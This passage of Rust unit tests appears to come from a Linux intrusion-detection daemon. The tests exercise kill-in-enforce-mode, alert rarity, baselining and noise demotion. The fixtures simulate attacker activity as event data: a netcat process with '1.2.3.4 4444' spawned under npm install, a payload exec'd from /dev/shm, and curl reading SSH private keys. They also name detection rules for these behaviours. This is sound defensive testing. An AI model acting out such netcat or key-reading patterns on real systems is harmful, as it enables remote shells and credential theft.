                        (start / 1_000_000_000) as i64,
                        (start % 1_000_000_000) as u32,
                    )
                    .expect("a start time inside the epoch")
                    .format("%Y-%m-%dT%H:%M:%S%.9fZ")
                    .to_string();
                    return (child, pid, ts, exe);
                }
                _ => {
                    let mut child = child;
                    let _ = child.kill();
                    let _ = child.wait();
                }
            }
        }
        panic!("{} never stayed alive long enough to be observed", path.display())
    }

    /// Enforce mode kills the netcat itself — verified against a real process,
    /// because "we verified the start time" is the whole point.
    #[test]
    fn enforce_mode_kills_a_netcat_and_records_it() {
        let dir = tempfile::tempdir().unwrap();
        let (mut d, _) = dev_daemon(dir.path());
        d.mode = "enforce".into();

        // A real process whose basename the rule matches: `sleep`, copied to
        // `<tmp>/nc`. Nothing here is faked — /proc is the witness.
        let Some(src) = ["/usr/bin/sleep", "/bin/sleep"]
            .iter()
            .map(Path::new)
            .find(|p| p.exists())
        else {
            return;
        };
        let victim = dir.path().join("nc");
        std::fs::copy(src, &victim).unwrap();
        {
            use std::os::unix::fs::PermissionsExt;
            std::fs::set_permissions(&victim, std::fs::Permissions::from_mode(0o755)).unwrap();
        }

        let (mut child, pid, ts, exe) = spawn_victim(&victim);

        d.handle_line(r#"{"process_exec":{"process":{"exec_id":"k-npm","pid":41201,"uid":1000,"binary":"/usr/bin/npm","arguments":"install","start_time":"2026-09-03T16:21:01.000000000Z"}}}"#);
        d.handle_line(&format!(
            r#"{{"process_exec":{{"process":{{"exec_id":"k-nc","pid":{},"uid":1000,"binary":"{}","arguments":"1.2.3.4 4444","start_time":"{}","parent_exec_id":"k-npm"}}}}}}"#,
            pid, exe, ts
        ));

        let a = d
            .store
            .load()
            .into_iter()
            .find(|a| a.rule == "moat-pkg-subtree-netcat-exec")
            .expect("nc inside an npm install is critical");
        assert_eq!(a.severity, "critical");
        assert_eq!(a.action_taken, "killed");
        assert!(a.explain.evidence.iter().any(|e| e.contains("sent SIGKILL")), "{:?}", a.explain.evidence);

        use std::os::unix::process::ExitStatusExt;
        let status = child.wait().unwrap();
        assert_eq!(status.signal(), Some(libc::SIGKILL), "the process was actually killed");

        // Same event in monitor mode: nothing dies.
        let dir2 = tempfile::tempdir().unwrap();
        let (mut d2, _) = dev_daemon(dir2.path());
        let victim2 = dir2.path().join("nc");
        std::fs::copy(src, &victim2).unwrap();
        {
            use std::os::unix::fs::PermissionsExt;
            std::fs::set_permissions(&victim2, std::fs::Permissions::from_mode(0o755)).unwrap();
        }
        let (mut child2, pid2, ts2, exe2) = spawn_victim(&victim2);
        d2.handle_line(r#"{"process_exec":{"process":{"exec_id":"k-npm","pid":41201,"uid":1000,"binary":"/usr/bin/npm","arguments":"install","start_time":"2026-09-03T16:21:01.000000000Z"}}}"#);
        d2.handle_line(&format!(
            r#"{{"process_exec":{{"process":{{"exec_id":"k-nc","pid":{},"uid":1000,"binary":"{}","arguments":"1.2.3.4 4444","start_time":"{}","parent_exec_id":"k-npm"}}}}}}"#,
            pid2, exe2, ts2
        ));
        let a2 = d2
            .store
            .load()
            .into_iter()
            .find(|a| a.rule == "moat-pkg-subtree-netcat-exec")
            .unwrap_or_else(|| panic!("no netcat alert for pid {}", pid2));
        assert_eq!(a2.action_taken, "none", "monitor mode never kills");
        assert!(std::path::Path::new(&format!("/proc/{}", pid2)).exists());
        let _ = child2.kill();
        let _ = child2.wait();
    }

    /// A binary executed from a file descriptor has no name in the kernel. The
    /// alert must not just say `/proc/self/fd/9` and stop.
    #[test]
    fn a_proc_self_fd_binary_is_resolved_and_the_substitution_is_evidence() {
        let dir = tempfile::tempdir().unwrap();
        let (mut d, _) = dev_daemon(dir.path());

        // Route 1: the hook carries the exec'd file (linux_binprm).
        d.handle_line(r#"{"process_exec":{"process":{"exec_id":"f-sh","pid":700,"uid":1000,"binary":"/usr/bin/sh","arguments":"/tmp/.x9k --quiet","start_time":"2026-09-03T16:20:00.000000000Z"}}}"#);
        d.handle_line(r#"{"process_lsm":{"process":{"exec_id":"f-fd","pid":701,"uid":1000,"binary":"/proc/self/fd/9","arguments":"","cwd":"/tmp","start_time":"2026-09-03T16:21:00.000000000Z","parent_exec_id":"f-sh"},"function_name":"bprm_check_security","policy_name":"moat-exec-untrusted-tmpfs","args":[{"linux_binprm_arg":{"path":"/dev/shm/payload"}}]},"time":"2026-09-03T16:21:00.100Z"}"#);

        let a = d.store.load().into_iter().next().expect("one alert");
        assert_eq!(a.process.exe, "/dev/shm/payload");
        let note = a
            .explain
            .evidence
            .iter()
            .find(|e| e.contains("/proc/self/fd/9"))
            .expect("the substitution must be evidence");
        assert!(note.contains("exec'd-file argument"), "{}", note);

        // Route 2: no hook argument, so the parent's argument 0 is used.
        let dir2 = tempfile::tempdir().unwrap();
        let (mut d2, _) = dev_daemon(dir2.path());
        d2.handle_line(r#"{"process_exec":{"process":{"exec_id":"g-sh","pid":800,"uid":1000,"binary":"/usr/bin/sh","arguments":"/tmp/.x9k --quiet","start_time":"2026-09-03T16:20:00.000000000Z"}}}"#);
        d2.handle_line(r#"{"process_exec":{"process":{"exec_id":"g-fd","pid":801,"uid":1000,"binary":"/proc/self/fd/9","arguments":"","cwd":"/tmp","start_time":"2026-09-03T16:21:00.000000000Z","parent_exec_id":"g-sh"}}}"#);
        assert_eq!(d2.table.get("g-fd").unwrap().exe, "/tmp/.x9k");
        assert!(d2
            .table
            .get("g-fd")
            .unwrap()
            .exe_note
            .as_ref()
            .unwrap()
            .contains("parent's argument 0"));
    }

    #[test]
    fn status_has_every_contract_field() {
        let dir = tempfile::tempdir().unwrap();
        let (d, _) = dev_daemon(dir.path());
        let s = d.status();
        for k in [
            "ok", "version", "mode", "tetragon", "policies", "policies_failed", "feeds",
            "unacked", "ledger", "sandbox", "socket_group",
        ] {
            assert!(s.get(k).is_some(), "status missing {}", k);
        }
        assert_eq!(s["socket_group"], "moat");
        assert!(s["unacked"].get("critical").is_some());
        // CONTRACT §5: three plainly named populations, and `needs_you` is
        // `unacked` as one number — the two must never be able to disagree.
        for k in ["needs_you", "recorded", "suppressed", "signal"] {
            assert!(s["ledger"].get(k).is_some(), "ledger missing {}", k);
        }
        let unacked: u64 = ["critical", "high", "medium", "low"]
            .iter()
            .map(|k| s["unacked"][k].as_u64().unwrap_or(0))
            .sum();
        assert_eq!(s["ledger"]["needs_you"].as_u64(), Some(unacked));
    }

    #[test]
    fn state_json_is_written_and_mode_survives_a_restart() {
        let dir = tempfile::tempdir().unwrap();
        let (mut d, cfg) = dev_daemon(dir.path());
        d.mode = "enforce".into();
        d.write_state();
        assert!(cfg.paths.state_file().exists());
        let d2 = Daemon::new(cfg.clone(), &dir.path().join("moat.toml")).unwrap();
        assert_eq!(d2.mode, "enforce");
    }

    // ================================================================
    // Baselining (docs/BASELINE.md, docs/LEARNING-AND-ANALYSIS.md §1)
    // ================================================================

    /// One exec line, with the parent already in the table.
    fn exec_line(id: &str, pid: u32, exe: &str, args: &str, parent: &str) -> String {
        format!(
            r#"{{"process_exec":{{"process":{{"exec_id":"{}","pid":{},"uid":1000,"binary":"{}","arguments":"{}","cwd":"/home/dan/proj","start_time":"2026-09-03T16:21:06.900000000Z"{}}}}}}}"#,
            id,
            pid,
            exe,
            args,
            if parent.is_empty() {
                String::new()
            } else {
                format!(r#","parent_exec_id":"{}""#, parent)
            }
        )
    }

    fn read_line(id: &str, pid: u32, exe: &str, args: &str, parent: &str, policy: &str, path: &str) -> String {
        format!(
            r#"{{"process_lsm":{{"process":{{"exec_id":"{}","pid":{},"uid":1000,"binary":"{}","arguments":"{}","cwd":"/home/dan/proj","start_time":"2026-09-03T16:21:06.900000000Z","parent_exec_id":"{}"}},"function_name":"file_post_open","policy_name":"{}","args":[{{"file_arg":{{"path":"{}"}}}},{{"int_arg":4}}]}},"time":"2026-09-03T16:21:07.000Z"}}"#,
            id, pid, exe, args, parent, policy, path
        )
    }

    #[test]
    fn every_alert_carries_actor_context_rarity_and_a_surface() {
        let dir = tempfile::tempdir().unwrap();
        let (mut d, _) = dev_daemon(dir.path());
        replay(&mut d);
        for a in d.store.load() {
            assert!(!a.severity_base.is_empty(), "{} has no severity_base", a.rule);
            assert!(!a.severity_reason.is_empty(), "{} has no severity_reason", a.rule);
            assert!(
                a.surface == "alerts" || a.surface == "timeline",
                "{} has surface {:?}",
                a.rule,
                a.surface
            );
            assert!(!a.rarity_text.is_empty(), "{} has no rarity sentence", a.rule);
            // BASELINE §5: only high and critical reach the Alerts tab ON THEIR
            // OWN. A member of a chain that reached `high` is the exception,
            // and it is not a silent one -- the alert carries the `chain` that
            // raised it, so a reader working from alerts.jsonl alone can see
            // exactly why a `low` is on the badge.
            if a.surface == "alerts" {
                let raised_by_chain = a
                    .chain
                    .as_ref()
                    .is_some_and(|c| crate::alert::severity_rank(&c.severity) >= 2);
                assert!(
                    a.severity_rank() >= 2 || raised_by_chain,
                    "{} is {} on the Alerts tab with no chain to justify it",
                    a.rule,
                    a.severity
                );
                // ...and nothing already answered for reaches it at all. The
                // recorded surface is the only thing a reader working from
                // alerts.jsonl alone has (an offline audit, the setup screen),
                // so it has to agree with what the UI shows rather than relying
                // on every consumer to recompute it.
                assert!(
                    a.suppressed_by.is_none(),
                    "{} is suppressed by {:?} but recorded on the Alerts tab",
                    a.rule,
                    a.suppressed_by
                );
            }
            let ev = a.explain.evidence.join("\n");
            assert!(ev.contains("actor: "), "{} has no actor evidence", a.rule);
            assert!(ev.contains("context: "), "{} has no context evidence", a.rule);
            assert!(ev.contains("rarity: "), "{} has no rarity evidence", a.rule);
        }
    }

    /// The interpreter rule, end to end: official `/usr/bin/sh` running a
    /// dropped script is a `user` actor, so nothing is softened.
    #[test]
    fn an_interpreter_takes_its_provenance_from_the_script_it_was_handed() {
        let dir = tempfile::tempdir().unwrap();
        let (mut d, _) = dev_daemon(dir.path());
        d.handle_line(&exec_line("e-term", 100, "/usr/bin/alacritty", "", ""));
        d.handle_line(&exec_line("e-sh", 101, "/usr/bin/sh", "/home/dan/proj/setup.sh", "e-term"));
        d.handle_line(&read_line(
            "e-sh",
            101,
            "/usr/bin/sh",
            "/home/dan/proj/setup.sh",
            "e-term",
            "moat-cred-ssh-private-key-read",
            "/home/dan/.ssh/id_ed25519",
        ));
        let a = d
            .store
            .load()
            .into_iter()
            .find(|a| a.rule == "moat-cred-ssh-private-key-read")
            .expect("an alert");
        assert_eq!(a.actor.provenance, crate::provenance::Provenance::User);
        assert_eq!(a.actor.script.as_deref(), Some("/home/dan/proj/setup.sh"));
        assert!(a.actor.package.is_none());
        // And the timeline groups on the script, not on /usr/bin/sh.
        assert_eq!(a.group_key(), "/home/dan/proj/setup.sh");
        // cred never earns a provenance downgrade; interactive takes one step.
        assert_eq!(a.context, crate::context::Context::Interactive);
        assert_eq!(a.severity_base, "high");
        assert_eq!(a.severity, "medium");
    }

    #[test]
    fn rarity_moves_from_first_seen_to_common_as_the_same_thing_recurs() {
        let dir = tempfile::tempdir().unwrap();
        let (mut d, _) = dev_daemon(dir.path());
        d.cfg.thresholds.dedupe_secs = 0; // one alert per event, not one per minute
        d.handle_line(&exec_line("e-term", 100, "/usr/bin/alacritty", "", ""));
        for i in 0..5 {
            d.handle_line(&read_line(
                "e-restic",
                200 + i,
                "/usr/bin/restic",
                "backup",
                "e-term",
                "moat-cred-ssh-private-key-read",
                "/home/dan/.ssh/id_ed25519",
            ));
        }
        // ULIDs minted in the same millisecond are not ordered among
        // themselves, so assert on the set rather than on the sequence.
        let alerts: Vec<Alert> = d
            .store
            .load()
            .into_iter()
            .filter(|a| a.rule == "moat-cred-ssh-private-key-read")
            .collect();
        assert_eq!(alerts.len(), 5, "dedupe is off for this test");
        let seen: Vec<&str> = alerts.iter().map(|a| a.rarity.as_str()).collect();
        assert_eq!(seen.iter().filter(|r| **r == "first_seen").count(), 1);
        assert!(seen.contains(&"rare"));
        assert!(seen.contains(&"common"), "{:?}", seen);
        // The sentence names the actor and the place, in words.
        let common = alerts.iter().find(|a| a.rarity.is_common()).unwrap();
        assert!(common.rarity_text.contains("/usr/bin/restic has read /home/dan/.ssh"), "{}", common.rarity_text);
        assert!(common.rarity_text.contains("seen "), "{}", common.rarity_text);
        let first = alerts.iter().find(|a| a.rarity == crate::rarity::Rarity::FirstSeen).unwrap();
        assert!(first.rarity_text.starts_with("first time "), "{}", first.rarity_text);
        assert!(!d.rarity.is_empty(), "the (actor, file dir) tuple is counted");
    }

    /// Feed the same official, medium pattern on three distinct days and it
    /// lands in baseline.toml and starts suppressing itself.
    #[test]
    fn the_learning_window_writes_a_baseline_entry_and_it_takes_effect() {
        let dir = tempfile::tempdir().unwrap();
        let (mut d, cfg) = dev_daemon(dir.path());
        d.cfg.thresholds.dedupe_secs = 0;
        assert!(d.baseline.learning(util::unix_secs()));

        // `restic` is official in the fixture, so a medium cred read from it is
        // exactly the shape §3 learns. A unit test cannot wait three days, so
        // the tuple's day list is back-dated between emissions; everything else
        // (rarity, provenance, severity, the write) is the real path.
        let path = cfg.paths.baseline_allowlist();
        let key = crate::baseline::tuple_key(
            "moat-cred-ssh-private-key-read",
            "/usr/bin/restic",
            "",
            "/home/dan/.ssh",
        );
        let restic_read = || {
            let mut f = Finding::new(
                "moat-cred-ssh-private-key-read",
                crate::policy::PolicyMeta::fallback("moat-cred-ssh-private-key-read"),
                ProcInfo {
                    exec_id: "e-restic".into(),
                    pid: 300,
                    uid: 0,
                    exe: "/usr/bin/restic".into(),
                    args: "backup".into(),
                    cwd: "/".into(),
                    start_time: util::now_rfc3339(),
                    parent_exec_id: None,
                    exited_at: None,
                    exit_signal: None,
                    exe_note: None,
                    sid: None,
                    tty: None,
                },
            );
            f.meta.family = "cred".into();
            f.meta.severity = "medium".into();
            f.hook = "file_post_open".into();
            f.hook_detail = Some("read".into());
            f.file = Some(crate::alert::FileRef {
                path: "/home/dan/.ssh/id_ed25519".into(),
                sha256: None,
            });
            f
        };
        // Three sightings: still `rare`, and only one distinct day.
        for _ in 0..3 {
            d.emit(restic_read());
        }
        assert!(!path.exists(), "not yet: one day, and the tuple is still rare");
        // Back-date two earlier days; the next sighting is the third distinct
        // day and the fourth sighting, which makes the tuple `common`.
        d.baseline.state.tuples.get_mut(&key).unwrap().days =
            vec!["2026-08-01".into(), "2026-08-02".into()];
        d.emit(restic_read());
        assert!(path.exists(), "baseline.toml must have been written");
        let text = std::fs::read_to_string(&path).unwrap();
        assert!(text.contains("# learned "), "{}", text);
        assert!(text.contains("3 distinct days"), "{}", text);
        assert!(text.contains("moat-cred-ssh-private-key-read"), "{}", text);
        assert!(text.contains("file = \"/home/dan/.ssh/*\""), "{}", text);
        assert_eq!(d.baseline.learned_entries().len(), 1);

        // It is live: the next identical event is recorded as suppressed.
        d.reload_allowlist();
        let n = d.alerts_suppressed;
        d.handle_line(&read_line(
            "e-r2",
            301,
            "/usr/bin/restic",
            "backup",
            "",
            "moat-cred-ssh-private-key-read",
            "/home/dan/.ssh/id_ed25519",
        ));
        assert!(d.alerts_suppressed > n, "the learned entry suppresses it");
        let last = d.store.load().into_iter().next_back().unwrap();
        assert_eq!(last.suppressed_by.as_deref(), Some("baseline.toml#1"));
    }

    /// After the window the same pattern is a proposal in state.json instead.
    #[test]
    fn after_the_window_a_recurring_pattern_shows_up_in_status_as_a_proposal() {
        let dir = tempfile::tempdir().unwrap();
        let (mut d, _) = dev_daemon(dir.path());
        d.baseline.state.learning_until = 1; // the window is long closed
        let now = util::unix_secs();
        for day in 0..3u64 {
            d.baseline.observe(&Observation {
                rule: "moat-persist-hypr-config-write",
                exe: "/usr/bin/restic",
                parent: "/usr/bin/Hyprland",
                dir: "/home/dan/.config/hypr",
                severity: "low",
                severity_base: "low",
                provenance: "official",
                package: Some("restic 0.18.1-1".into()),
                context: "service",
                rarity: "common",
                suppressed: false,
                demoted: false,
                ts: format!("2026-09-0{}T10:00:00.000Z", day + 1),
                now,
            });
        }
        let s = d.status();
        assert_eq!(s["baseline"]["learning"], false);
        assert_eq!(s["baseline"]["proposals"], 1);
        let p = &s["proposals"][0];
        for k in ["id", "rule", "exe", "parent", "dir", "count", "days", "first_seen", "last_seen", "toml"] {
            assert!(p.get(k).is_some(), "proposal has no {}", k);
        }
        assert_eq!(p["days"], 3);
        assert!(p["toml"].as_str().unwrap().contains("[[rule]]"));
    }

    /// The retroactive half of a demotion is the daemon's, and it is scoped
    /// exactly as the demotion is: the pattern's earlier alerts leave the
    /// badge, another pattern of the same rule does not, and a step a `high`
    /// chain re-surfaced is not silenced by a noise count.
    #[test]
    fn a_demotion_quietens_the_backlog_it_covers_and_nothing_else() {
        let dir = tempfile::tempdir().unwrap();
        let (mut d, _) = dev_daemon(dir.path());
        d.cfg.thresholds.dedupe_secs = 0;
        // This test is about the noise guard, not about provenance. Since
        // provenance applies AFTER the context matrix (2026-09-05), the fixture
        // actor `/usr/bin/restic` is official under the pacman test db and its
        // `persist` alerts score medium — off the badge, never counted by the
        // guard, and the test would be measuring the wrong mechanism.
        d.cfg.baseline.provenance_downgrade = false;
        d.handle_line(&exec_line("e-hypr", 1, "/usr/bin/Hyprland", "", ""));
        // A different pattern of the same rule, on the badge before the flood.
        // Same actor, different directory: a different (rule, exe, parent,
        // dir) tuple, and so a different pattern to the noise guard.
        d.handle_line(&read_line(
            "e-other",
            300,
            "/usr/bin/restic",
            "backup",
            "e-hypr",
            "moat-persist-hypr-config-write",
            "/home/dan/.config/hypr/conf.d/extra.conf",
        ));
        let other = d
            .store
            .load()
            .into_iter()
            .find(|a| a.file.as_ref().map_or(false, |f| f.path.contains("conf.d")))
            .expect("the conf.d alert");
        assert_eq!(other.surface, "alerts", "precondition: on the badge");

        for i in 0..25u32 {
            d.handle_line(&read_line(
                &format!("e-w{}", i),
                400 + i,
                "/usr/bin/restic",
                "backup",
                "e-hypr",
                "moat-persist-hypr-config-write",
                &format!("/home/dan/.config/hypr/gen{}.conf", i % 4),
            ));
        }
        assert_eq!(
            d.baseline.demoted_pattern_count(),
            1,
            "one pattern flooded, not the rule"
        );
        let alerts = d.store.load();
        let flood: Vec<_> = alerts
            .iter()
            .filter(|a| a.file.as_ref().map_or(false, |f| f.path.contains("/hypr/gen")))
            .collect();
        assert!(flood.len() > 20);
        for a in &flood {
            assert_eq!(a.surface, "timeline", "{} raised before the demotion is quiet after it", a.id);
        }
        let vim = alerts.iter().find(|a| a.id == other.id).unwrap();
        assert_eq!(vim.surface, "alerts", "the other pattern is untouched");

        // What the panel counts and what the daemon counts are now the same
        // set, with no list to consult.
        let waiting: Vec<_> = alerts
            .iter()
            .filter(|a| a.rule == "moat-persist-hypr-config-write" && !a.acked && a.surface == "alerts")
            .collect();
        assert_eq!(waiting.len(), 1);
        assert_eq!(waiting[0].id, vim.id);
        // The guard's own announcement is medium, so it is on the timeline and
        // not in this number either.
        assert_eq!(d.store.unacked()["high"], 1);
    }

    /// `status.unacked`, the watchdog's "N alerts waiting", and the panel's
    /// badge all answer one question. Two of them had their own filter.
    #[test]
    fn status_unacked_and_the_watchdog_count_the_same_thing() {
        let dir = tempfile::tempdir().unwrap();
        let (mut d, _) = dev_daemon(dir.path());
        d.cfg.thresholds.dedupe_secs = 0;
        d.handle_line(&exec_line("e-sh", 1, "/usr/bin/bash", "", ""));
        // Two on the badge, one timelined by a triage demotion, one medium
        // (timeline by severity), one suppressed.
        for (i, path) in ["/home/dan/.ssh/id_ed25519", "/home/dan/.ssh/id_rsa_moat_fixture"].iter().enumerate() {
            d.handle_line(&read_line(
                &format!("e-k{}", i), 500 + i as u32, "/usr/bin/curl", "", "e-sh",
                "moat-cred-ssh-private-key-read", path,
            ));
        }
        d.handle_line(&read_line(
            "e-t", 510, "/usr/bin/curl", "", "e-sh",
            "moat-cred-ssh-private-key-read", "/home/dan/.ssh/id_ecdsa_moat_fixture",
        ));
        let timelined = d.store.load().into_iter().rfind(|a| a.surface == "alerts").unwrap();
        d.mark(&timelined.id, "surface", Value::from("timeline")).unwrap();

        let s = d.status();
        let status_total: u64 = ["critical", "high", "medium", "low"]
            .iter()
            .map(|k| s["unacked"][k].as_u64().unwrap_or(0))
            .sum();
        let badge = d
            .store
            .load()
            .iter()
            .filter(|a| !a.acked && !a.is_suppressed() && a.surface == "alerts")
            .count() as u64;
        assert_eq!(status_total, badge, "status.unacked is the badge, not every unacked record");
        assert!(badge >= 2, "precondition");
        // And the record the daemon itself timelined is not "unacked" anywhere.
        assert!(d.store.load().iter().any(|a| !a.acked && a.surface == "timeline"));
    }

    /// BASELINE §4: a flooding rule is demoted, one alert explains it, and the
    /// demoted alerts stay on the timeline **without** being suppressed.
    #[test]
    fn a_flooding_rule_is_demoted_and_says_so_exactly_once() {
        let dir = tempfile::tempdir().unwrap();
        let (mut d, _) = dev_daemon(dir.path());
        d.cfg.thresholds.dedupe_secs = 0;
        // See `a_demotion_quietens_the_backlog_it_covers_and_nothing_else`:
        // `/usr/bin/restic` is official under the test pacman db, so with the
        // provenance step on these alerts never reach the badge and the noise
        // guard — the thing under test — never counts them.
        d.cfg.baseline.provenance_downgrade = false;
        d.handle_line(&exec_line("e-hypr", 1, "/usr/bin/Hyprland", "", ""));
        for i in 0..25u32 {
            d.handle_line(&read_line(
                &format!("e-w{}", i),
                400 + i,
                "/usr/bin/restic",
                "backup",
                "e-hypr",
                "moat-persist-hypr-config-write",
                &format!("/home/dan/.config/hypr/gen{}.conf", i % 4),
            ));
        }
        // One shape flooding demotes that shape, not the whole rule -- which is
        // the point: another shape of this rule stays on the badge.
        assert_eq!(d.baseline.demoted_pattern_count(), 1);
        assert!(d
            .baseline
            .demoted_rules()
            .contains(&"moat-persist-hypr-config-write".to_string()));
        assert_eq!(
            d.status()["demoted_rules"].as_array().unwrap().len(),
            1,
            "demoted_rules is a top-level status field"
        );

        let alerts = d.store.load();
        let noisy: Vec<_> = alerts
            .iter()
            .filter(|a| a.rule == crate::rules::NOISY_RULE)
            .collect();
        assert_eq!(noisy.len(), 1, "one alert about the flood, not one per alert");
        let n = noisy[0];
        assert_eq!(n.severity, "medium");
        assert!(n.explain.evidence.iter().any(|e| e.starts_with("top 1: ")));
        let scopes: Vec<&str> = n.explain.if_expected.options.iter().map(|o| o.scope.as_str()).collect();
        assert!(scopes.contains(&"these-are-expected"), "{:?}", scopes);
        assert!(scopes.contains(&"keep-watching"), "{:?}", scopes);
        let expected = n
            .explain
            .if_expected
            .options
            .iter()
            .find(|o| o.scope == "these-are-expected")
            .unwrap();
        assert!(expected.line.contains("moat-persist-hypr-config-write"));
        assert!(n
            .explain
            .if_expected
            .options
            .iter()
            .any(|o| o.cmd.contains("baseline undemote moat-persist-hypr-config-write")));

        // Later alerts of the demoted rule: timeline, but NOT suppressed.
        d.handle_line(&read_line(
            "e-after",
            999,
            "/usr/bin/restic",
            "backup",
            "e-hypr",
            "moat-persist-hypr-config-write",
            "/home/dan/.config/hypr/after.conf",
        ));
        let last = d
            .store
            .load()
            .into_iter()
            .rfind(|a| a.rule == "moat-persist-hypr-config-write")
            .unwrap();
        assert_eq!(last.surface, "timeline");
        assert_eq!(last.suppressed_by, None, "a demoted rule is not a suppression");
        assert!(last.explain.evidence.iter().any(|e| e.contains("noise guard")));
    }

    /// LEARNING §1: a learned entry whose actor stops being official is
    /// disabled in place, with a reason and a low alert.
    #[test]
    fn a_learned_entry_is_revoked_when_its_actor_stops_being_official() {
        let dir = tempfile::tempdir().unwrap();
        let (mut d, cfg) = dev_daemon(dir.path());

        // A private copy of the pacman fixture we can mutate.
        let local = dir.path().join("pacman-local");
        let src = Path::new(env!("CARGO_MANIFEST_DIR")).join("testdata/pacman-local");
        std::fs::create_dir_all(&local).unwrap();
        for e in std::fs::read_dir(&src).unwrap().flatten() {
            let d2 = local.join(e.file_name());
            std::fs::create_dir_all(&d2).unwrap();
            for f in ["desc", "files"] {
                std::fs::copy(e.path().join(f), d2.join(f)).unwrap();
            }
        }
        d.cfg.paths.pacman_local = local.clone();
        d.provenance = crate::provenance::Classifier::new(
            &local,
            &d.cfg.baseline.trusted_repos,
            &d.homes,
            Box::new(PacmanSl { bin: cfg.paths.pacman.clone() }),
        );
        assert!(d.provenance.classify_path("/usr/bin/restic").0.is_official());

        // Learn an entry for it.
        let now = util::unix_secs();
        for day in 0..3u64 {
            d.baseline.observe(&Observation {
                rule: "moat-cred-ssh-private-key-read",
                exe: "/usr/bin/restic",
                parent: "",
                dir: "/home/dan/.ssh",
                severity: "medium",
                severity_base: "medium",
                provenance: "official",
                package: Some("restic 0.18.1-1".into()),
                context: "service",
                rarity: "common",
                suppressed: false,
                demoted: false,
                ts: format!("2026-09-0{}T10:00:00.000Z", day + 1),
                now,
            });
        }
        let entry = d.baseline.learned_entries();
        assert_eq!(entry.len(), 1);
        let t = d.baseline.state.tuples.get(&entry[0].key).unwrap().clone();
        let path = d.cfg.paths.baseline_allowlist();
        crate::allowlist::append_rule(&path, &t.comment("learned"), &t.spec()).unwrap();
        d.reload_allowlist();
        assert_eq!(d.allowlist.len(), 1);

        // Now `restic` is rebuilt from the AUR: same package name, no repo, no
        // validation. A pacman transaction moved the directory's mtime.
        std::fs::write(
            local.join("restic-0.18.1-1/desc"),
            "%NAME%\nrestic\n\n%VERSION%\n0.18.1-1\n\n%VALIDATION%\nnone\n",
        )
        .unwrap();
        d.provenance.refresh_if_changed();
        // Force the mtime check to fire regardless of filesystem granularity.
        d.provenance = crate::provenance::Classifier::new(
            &local,
            &d.cfg.baseline.trusted_repos,
            &d.homes,
            Box::new(PacmanSl { bin: cfg.paths.pacman.clone() }),
        );
        assert_eq!(
            d.provenance.classify_path("/usr/bin/restic").0,
            crate::provenance::Provenance::Foreign
        );
        // on_pacman_change only acts on a real mtime move, so drive the check.
        let revoked = d.revoke_stale_learned_entries();
        assert_eq!(revoked, 1);

        let text = std::fs::read_to_string(&path).unwrap();
        assert!(text.contains("# DISABLED"), "{}", text);
        assert!(text.contains("no longer official"), "{}", text);
        d.reload_allowlist();
        assert_eq!(d.allowlist.len(), 0, "the entry stopped matching");
        assert!(d.baseline.learned_entries().is_empty());

        let a = d
            .store
            .load()
            .into_iter()
            .find(|a| a.rule == crate::rules::BASELINE_REVOKED)
            .expect("a low alert says why");
        assert_eq!(a.severity, "low");
        assert!(a.explain.what.contains("no longer shipped by a trusted repository"));
    }

    /// BASELINE §8: a suppressed alert still folds and still gets its `count`
    /// updates, so the timeline shows one greyed row with a number rather than
    /// a thousand of them — or nothing at all.
    #[test]
    fn dedupe_and_count_updates_still_work_for_suppressed_alerts() {
        let dir = tempfile::tempdir().unwrap();
        let (mut d, cfg) = dev_daemon(dir.path());
        std::fs::write(
            cfg.paths.allowlist_dir.join("user.toml"),
            "# expected\n[[rule]]\nname = \"moat-cred-ssh-private-key-read\"\nexe = \"/usr/bin/restic\"\n",
        )
        .unwrap();
        d.reload_allowlist();
        let line = read_line(
            "e-restic",
            700,
            "/usr/bin/restic",
            "backup",
            "",
            "moat-cred-ssh-private-key-read",
            "/home/dan/.ssh/id_ed25519",
        );
        for _ in 0..5 {
            d.handle_line(&line);
        }
        let alerts: Vec<Alert> = d
            .store
            .load()
            .into_iter()
            .filter(|a| a.rule == "moat-cred-ssh-private-key-read")
            .collect();
        assert_eq!(alerts.len(), 1, "one folded row, not five");
        assert_eq!(alerts[0].count, Some(5), "the count updates still land");
        assert_eq!(alerts[0].suppressed_by.as_deref(), Some("user.toml#1"));
        assert_eq!(d.store.unacked()["high"], 0, "and none of it is counted");
        // Rarity kept learning through all five, suppressed or not.
        assert_eq!(
            d.rarity
                .peek(&Tuple::file("/usr/bin/restic", "/home/dan/.ssh/id_ed25519", "read"), util::unix_secs())
                .total,
            5
        );
    }

    #[test]
    fn status_carries_the_shapes_the_plugin_builds_against() {
        let dir = tempfile::tempdir().unwrap();
        let (d, _) = dev_daemon(dir.path());
        let s = d.status();
        for k in ["installed_at", "baseline", "proposals", "demoted_rules"] {
            assert!(s.get(k).is_some(), "status missing {}", k);
        }
        let b = &s["baseline"];
        for k in ["learning", "learning_ends", "proposals", "learned", "demoted"] {
            assert!(b.get(k).is_some(), "status.baseline missing {}", k);
        }
        assert!(b["learning"].as_bool().unwrap(), "a fresh install is learning");
        assert!(b["demoted"].is_array());
        assert!(s["proposals"].is_array());
        assert!(s["demoted_rules"].is_array());
        assert!(s["installed_at"].as_str().unwrap().ends_with('Z'));
    }

    #[test]
    fn installed_at_is_read_back_out_of_state_json() {
        let dir = tempfile::tempdir().unwrap();
        let (d, cfg) = dev_daemon(dir.path());
        d.write_state();
        let stamped = d.baseline.state.installed_at;
        // A wiped baseline.json must not restart the window.
        std::fs::remove_file(cfg.paths.state_dir.join("baseline.json")).ok();
        let d2 = {
            let mut c = cfg.clone();
            c.baseline.learning_days = 7;
            Daemon::new(c, &dir.path().join("moat.toml")).unwrap()
        };
        assert_eq!(d2.baseline.state.installed_at, stamped);
    }

    // ------------------------------------------ receipts, incidents, digest

    /// LEARNING §3: one install, one receipt, written when the **root** exits.
    #[test]
    fn a_package_install_writes_exactly_one_receipt_when_its_root_exits() {
        let dir = tempfile::tempdir().unwrap();
        let (mut d, _) = dev_daemon(dir.path());
        let t0 = util::rfc3339_of(util::unix_secs());

        // npm -> sh -> node(postinstall), plus a nested npm frame that must not
        // produce a second receipt, and a binary out of /tmp.
        d.handle_line(&format!(
            r#"{{"process_exec":{{"process":{{"exec_id":"r-npm","pid":41201,"uid":1000,"cwd":"/home/dan/proj","binary":"/usr/bin/npm","arguments":"install","start_time":"{}"}}}}}}"#,
            t0
        ));
        d.handle_line(&format!(
            r#"{{"process_exec":{{"process":{{"exec_id":"r-npm2","pid":41210,"uid":1000,"cwd":"/home/dan/proj","binary":"/usr/bin/npm","arguments":"run build","start_time":"{}","parent_exec_id":"r-npm"}}}}}}"#,
            t0
        ));
